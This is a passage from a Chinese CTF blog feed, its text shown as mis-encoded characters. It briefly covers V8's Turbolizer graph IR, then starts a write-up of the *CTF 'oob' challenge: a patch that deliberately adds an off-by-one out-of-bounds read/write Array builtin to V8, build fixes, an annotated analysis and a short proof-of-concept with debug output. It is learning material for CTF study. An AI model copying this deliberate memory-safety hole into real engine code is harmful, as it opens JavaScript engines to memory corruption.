title="Turbolizer"></a>Turbolizer</h3><p>V8çš„IRæ˜¯ä¸€ç§å›¾IRï¼Œè¿™ä¸ªå·¥å…·å¯ä»¥å°†å…¶å¯è§†åŒ–</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117175920222.png"                      alt="image-20241117175920222"                ><figcaption>image-20241117175920222</figcaption></figure></p><p>V8çš„å›¾IRç»“åˆçš„æ§åˆ¶æµä¸æ•°æ®æµï¼Œæœ‰å¤šç§edge</p><ul><li><p>value edgesï¼Œæ¯”å¦‚å¯ä»¥è¡¨ç¤ºå‡½æ•°ä¼ å‚å…³ç³»ï¼Œç±»ä¼¼æ•°æ®æµåˆ†æä¸­DFGçš„edge</p></li><li><p>control edgesï¼Œç±»ä¼¼æ§åˆ¶æµåˆ†æä¸­CFGçš„edge</p></li><li><p>effect edgesæ¯”è¾ƒç‰¹æ®Šï¼Œè¡¨ç¤ºâ€œå‰¯ä½œç”¨â€ï¼Œä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œè™šçº¿éƒ¨åˆ†å°±æ˜¯ä¹‹å‰è¯´çš„inline Cacheï¼Œåœ¨æ£€æŸ¥æ˜¯å¦å¯ä»¥å‘½ä¸­ç¼“å­˜ä¸­çš„Map</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117175928650.png"                      alt="image-20241117175928650"                ><figcaption>image-20241117175928650</figcaption></figure></p></li></ul><blockquote><p>å‰¯ä½œç”¨æ“ä½œï¼ˆå¦‚å†…å­˜è¯»å†™ï¼‰ä¹‹é—´å¯èƒ½æœ‰ä¾èµ–å…³ç³»ã€‚Effect Edges è¡¨ç¤ºè¿™äº›ä¾èµ–ï¼Œå¸®åŠ©ç¼–è¯‘å™¨è¯†åˆ«å“ªäº›æ“ä½œå¯ä»¥é‡æ’ã€å“ªäº›ä¸èƒ½ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js-engine </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V8-pwnå…¥é—¨(2)â€”â€”[*CTF]oob</title>
      <link href="/2024/11/14/V8-pwn%E5%85%A5%E9%97%A8-2-%E2%80%94%E2%80%94-CTF-oob/"/>
      <url>/2024/11/14/V8-pwn%E5%85%A5%E9%97%A8-2-%E2%80%94%E2%80%94-CTF-oob/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-ç¯å¢ƒé…ç½®ğŸ”§"><a href="#0x00-ç¯å¢ƒé…ç½®ğŸ”§" class="headerlink" title="0x00 ç¯å¢ƒé…ç½®ğŸ”§"></a>0x00 ç¯å¢ƒé…ç½®ğŸ”§</h2><h3 id="oob-diff"><a href="#oob-diff" class="headerlink" title="oob.diff"></a>oob.diff</h3><div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"></span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"></span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>ç¼–è¯‘v8,åœ¨v8ç›®å½•ä¸‹</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598 -f</span><br><span class="line">gclient sync</span><br><span class="line">git apply oob.diff</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div><p>å¦‚æœæŠ¥é”™ï¼Œè¯´æ˜æ‰¾ä¸åˆ°pythonå‘½ä»¤ï¼Œå¯ä»¥&#x2F;usr&#x2F;binç›®å½•ä¸‹åˆ›ä¸ªè½¯é“¾æ¥ï¼ˆå°½é‡é“¾æ¥åˆ°python2ï¼Œpython3åç»­è¿˜ä¼šæŠ¥é”™ï¼‰</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 4653, <span class="keyword">in</span> main</span><br><span class="line">    <span class="built_in">return</span> dispatcher.execute(OptionParser(), argv)</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/subcommand.py&quot;</span>, line 254, <span class="keyword">in</span> execute</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">command</span>(parser, args[1:])</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 4006, <span class="keyword">in</span> CMDsync</span><br><span class="line">    ret = client.RunOnDeps(<span class="string">&#x27;update&#x27;</span>, args)</span><br><span class="line">          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 2517, <span class="keyword">in</span> RunOnDeps</span><br><span class="line">    self.RunHooksRecursively(self._options, pm)</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 1473, <span class="keyword">in</span> RunHooksRecursively</span><br><span class="line">    hook.run()</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 256, <span class="keyword">in</span> run</span><br><span class="line">    gclient_utils.CheckCallAndFilter(cmd,</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient_utils.py&quot;</span>, line 640, <span class="keyword">in</span> CheckCallAndFilter</span><br><span class="line">    kid = subprocess2.Popen(args,</span><br><span class="line">          ^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/subprocess2.py&quot;</span>, line 158, <span class="keyword">in</span> __init__</span><br><span class="line">    raise OSError(</span><br><span class="line">OSError: Execution failed with error: [Errno 2] No such file or directory: <span class="string">&#x27;python&#x27;</span>.</span><br><span class="line">Check that /root/v8 or python exist and have execution permission.</span><br></pre></td></tr></table></figure></div><p>è§£å†³</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s $(<span class="built_in">which</span> python2) /usr/bin/python</span><br></pre></td></tr></table></figure></div><p>å¦‚æœæŠ¥é”™</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar (child): xz: Cannot exec: No such file or directory</span><br><span class="line">tar (child): Error is not recoverable: exiting now</span><br><span class="line">tar: Child returned status 2</span><br><span class="line">tar: Error is not recoverable: exiting now</span><br></pre></td></tr></table></figure></div><p>è§£å†³</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install xz-utils</span><br></pre></td></tr></table></figure></div><p>å¦‚æœæŠ¥é”™</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  File &quot;/home/fuzz/Fuzzing_v8_75/v8/build/config/linux/pkg-config.py&quot;, line 246, in &lt;module&gt;</span><br><span class="line">    sys.exit(main())</span><br><span class="line">  File &quot;/home/fuzz/Fuzzing_v8_75/v8/build/config/linux/pkg-config.py&quot;, line 141, in main</span><br><span class="line">    prefix = GetPkgConfigPrefixToStrip(options, args)</span><br><span class="line">  File &quot;/home/fuzz/Fuzzing_v8_75/v8/build/config/linux/pkg-config.py&quot;, line 80, in GetPkgConfigPrefixToStrip</span><br><span class="line">    &quot;--variable=prefix&quot;] + args, env=os.environ)</span><br><span class="line">  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 216, in check_output</span><br><span class="line">    process = Popen(stdout=PIPE, *popenargs, **kwargs)</span><br><span class="line">  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 394, in __init__</span><br><span class="line">    errread, errwrite)</span><br><span class="line">  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 1047, in _execute_child</span><br><span class="line">    raise child_exception</span><br><span class="line">OSError: [Errno 2] No such file or directory</span><br><span class="line"></span><br><span class="line">See //build/config/linux/BUILD.gn:89:3: whence it was called.</span><br><span class="line">  pkg_config(&quot;glib&quot;) &#123;</span><br><span class="line">  ^-------------------</span><br><span class="line">See //build/config/compiler/BUILD.gn:218:18: which caused the file to be included.</span><br><span class="line">    configs += [ &quot;//build/config/linux:compiler&quot; ]</span><br></pre></td></tr></table></figure></div><p>è§£å†³</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install pkg-config</span><br></pre></td></tr></table></figure></div><h2 id="0x01-patchåˆ†æğŸ§"><a href="#0x01-patchåˆ†æğŸ§" class="headerlink" title="0x01 patchåˆ†æğŸ§"></a>0x01 patchåˆ†æğŸ§</h2><p>æ³¨å†Œäº†å«oobçš„arrayå†…ç½®å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å½¢å¦‚<code>arr.oob()</code>å¯¹ä»»æ„arrayè°ƒç”¨è¿™ä¸ªoob</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;oob&quot;</span>,</span><br><span class="line">                       Builtins::kArrayOob,<span class="number">2</span>,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div><p>å…·ä½“å†…ç½®å‡½æ•°å®ç°åˆ†æ</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BUILTIN</span>(ArrayOob)&#123;</span><br><span class="line">    <span class="type">uint32_t</span> len = args.<span class="built_in">length</span>();<span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°è¢«è°ƒç”¨oobæ–¹æ³•çš„arræœ¬èº«</span></span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();<span class="comment">//arr.oob()è¦ä¸ä¸ä¼ å‚ï¼Œè¦ä¹ˆåªä¼ ä¸€ä¸ª</span></span><br><span class="line">    Handle&lt;JSReceiver&gt; receiver;<span class="comment">//å¯ä»¥ç²—ç•¥ç†è§£æˆé¢„å®šä¹‰â¼€ä¸ªæŒ‡å‘JSReceiverçš„æŒ‡é’ˆreceiverï¼Œå½“ç„¶Handleå®é™…ä¸Šä¸æ˜¯æŒ‡é’ˆï¼ˆæ¶‰åŠgcç›¸å…³æ¦‚å¿µï¼‰ï¼Œå…ˆä¸å±•å¼€</span></span><br><span class="line">    <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">            isolate, receiver, Object::<span class="built_in">ToObject</span>(isolate, args.<span class="built_in">receiver</span>()));<span class="comment">//ä¸€ä¸ªå®ï¼Œå¯¹args.receiver()è°ƒâ½¤ToObjectå‡½æ•°åä¿å­˜åˆ°receiverâ¾¥ï¼Œè¿™â¾¥çš„args.receiver()å®é™…ä¸Šå°±æ˜¯è·å–å½¢å¦‚arr1.oob()è°ƒâ½¤â¾¥çš„arr1æœ¬â¾</span></span><br><span class="line">    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::<span class="built_in">cast</span>(receiver);</span><br><span class="line">    FixedDoubleArray elements = FixedDoubleArray::<span class="built_in">cast</span>(array-&gt;<span class="built_in">elements</span>());<span class="comment">//å–å‡ºarrayçš„elementsï¼Œcaståˆ°ä¸€ä¸ªFixedDoubleArrayï¼Œè¯´æ˜ä¹‹åå°±æŠŠè¿™ä¸ªelementså½“æˆdouble arrayæ¥è§£æ</span></span><br><span class="line">    <span class="type">uint32_t</span> length = <span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(array-&gt;<span class="built_in">length</span>()-&gt;<span class="built_in">Number</span>());</span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//read</span></span><br><span class="line">        <span class="keyword">return</span> *(isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(elements.<span class="built_in">get_scalar</span>(length)));<span class="comment">//*****</span></span><br><span class="line">      <span class="comment">//å¦‚æœå‡½æ•°å‚æ•°åªæœ‰â¼€ä¸ªï¼Œé‚£ä¹ˆå®ƒå°†è¯»å–elements[length]çš„å€¼ï¼Œå¹¶ä»¥â¼€ä¸ªdoubleå€¼è¿”å›</span></span><br><span class="line">      <span class="comment">//æ¼æ´ç‚¹ï¼Œè¶Šç•Œè¯»å–äº†ä¸€ä¸ªå…ƒç´ ï¼Œæ­£å¸¸æ¥è¯´åº”è¯¥æ˜¯elements[length-1]</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//write</span></span><br><span class="line">        Handle&lt;Object&gt; value;<span class="comment">//é¢„å®šä¹‰â¼€ä¸ªæŒ‡å‘Objectçš„æŒ‡é’ˆvalue</span></span><br><span class="line">        <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">                isolate, value, Object::<span class="built_in">ToNumber</span>(isolate, args.<span class="built_in">at</span>&lt;Object&gt;(<span class="number">1</span>)));<span class="comment">//å–å‡ºå‚æ•°argsçš„ç¬¬â¼†ä¸ªå‚æ•°ï¼ˆoobçš„ä¼ å‚ï¼‰ï¼Œå¯¹å…¶è°ƒâ½¤ToNumberå‡½æ•°ä¹‹åä¿å­˜åˆ°valueâ¾¥ã€‚</span></span><br><span class="line">        elements.<span class="built_in">set</span>(length,value-&gt;<span class="built_in">Number</span>());</span><br><span class="line">      <span class="comment">//elements[length] = value-&gt;Number()ï¼Œå‘åè¶Šç•Œå†™ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="0x02-è°ƒè¯•æ–¹æ³•ğŸ"><a href="#0x02-è°ƒè¯•æ–¹æ³•ğŸ" class="headerlink" title="0x02 è°ƒè¯•æ–¹æ³•ğŸ"></a>0x02 è°ƒè¯•æ–¹æ³•ğŸ</h2><p>è¿™ä¸ªpatchæ˜¯ç”¨CSAå®ç°çš„å†…ç½®å‡½æ•°ï¼Œæœ€ç»ˆä¼šè½¬æ¢æˆæ±‡ç¼–ï¼Œä¸å¥½æ‰“æ–­ç‚¹è°ƒè¯•ï¼Œå› æ­¤å¯ä»¥ç”¨CSAé‡Œé¢çš„PrintFæ¥ä»£æ›¿printf</p><ul><li>å¯¹äº<code>Handle&lt;Object&gt;</code>ï¼ˆå’Œ<code>Object</code>çš„â¼¦ç±»ï¼‰ï¼Œå¯ä»¥ç›´æ¥åœ¨ä¸Šâ¾¯è°ƒâ½¤<code>xxx-&gt;Print()</code>æ¥è¾“å‡ºå†…å­˜å¸ƒå±€</li></ul><p>è¿™é‡ŒåŠ ä¸Š</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115180840728.png"                      alt="image-20241115180840728"                ><figcaption>image-20241115180840728</figcaption></figure></p><p>ç„¶åé‡æ–°ç¼–è¯‘</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ninja -C out/x64.release d8</span><br><span class="line">tools/dev/gm.py x64.debug</span><br></pre></td></tr></table></figure></div><p>çœ‹çœ‹è°ƒè¯•ç»“æœï¼Œç›¸å½“äºæŠŠjob xxxçš„ä¿¡æ¯æ‰“å°å‡ºæ¥äº†</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">a.<span class="title function_">oob</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">a.<span class="title function_">oob</span>();</span><br><span class="line">a.<span class="title function_">oob</span>(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">âœ  v8 <span class="attr">git</span>:(6dc88c191f5) âœ— ./out/x64.<span class="property">release</span>/d8 --allow-natives-syntax poc.<span class="property">js</span></span><br><span class="line"><span class="number">0x0a5c3bbcdd89</span> &lt;<span class="title class_">JSArray</span>[<span class="number">1</span>]&gt;</span><br><span class="line">oob args length is <span class="number">3</span></span><br><span class="line">oob args length is <span class="number">1</span></span><br><span class="line"><span class="number">0xa5c3bbcdd89</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x17a965e82ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x2742413d1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x1b0aadec0c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x23511b3401a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">oob args length is <span class="number">2</span></span><br><span class="line"><span class="number">0xa5c3bbcdd89</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x17a965e82ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x2742413d1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x1b0aadec0c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x23511b3401a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="title class_">Smi</span>: <span class="number">0x1</span> (<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><h2 id="0x03-æ¼æ´åˆ†æğŸ”"><a href="#0x03-æ¼æ´åˆ†æğŸ”" class="headerlink" title="0x03 æ¼æ´åˆ†æğŸ”"></a>0x03 æ¼æ´åˆ†æğŸ”</h2><h3 